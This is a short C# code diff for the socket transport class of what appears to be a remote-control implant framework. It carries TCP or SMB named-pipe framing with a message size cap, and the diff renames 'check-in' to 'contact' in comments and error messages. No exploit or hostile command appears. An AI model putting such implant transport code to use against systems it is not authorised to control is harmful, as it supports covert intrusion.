@@ -15,7 +15,7 @@ namespace Rod.Implant.Internal;
 /// The socket wire: one duplex stream over the dial the URL names -- a TCP
 /// socket for tcp://host:port, a named pipe for smb://host/pipe/name (a dot
 /// host is the local machine; a remote host is the Windows SMB pipe share)
-/// -- carrying the stream check-in framing: one self-delimited message per
+/// -- carrying the stream contact framing: one self-delimited message per
 /// direction turn, a varint byte length then the envelope's delimited frame
 /// sequence. No TLS and no client certificate ride it: the identity is the
 /// id in the handshake (architecture.md Sec 8, the certificate-less
@@ -24,7 +24,7 @@ namespace Rod.Implant.Internal;
 internal sealed class SocketWire : IDisposable
 {
     // The message budget: the envelope's wire-body cap, the same ceiling the
-    // poll bridges enforce on a check-in message.
+    // poll bridges enforce on a contact message.
     private const int MaxMessageBytes = 16 * 1024 * 1024;
 
     // How long the dial itself may take: a poll cycle is bounded, and a
@@ -141,10 +141,10 @@ internal sealed class SocketWire : IDisposable
                 break;
             shift += 7;
             if (shift > 28)
-                throw new InvalidOperationException("check-in length prefix is a malformed varint");
+                throw new InvalidOperationException("contact length prefix is a malformed varint");
         }
         if (length > MaxMessageBytes)
-            throw new InvalidOperationException("check-in message exceeds the body budget");
+            throw new InvalidOperationException("contact message exceeds the body budget");
 
         var body = new byte[length];
         var offset = 0;
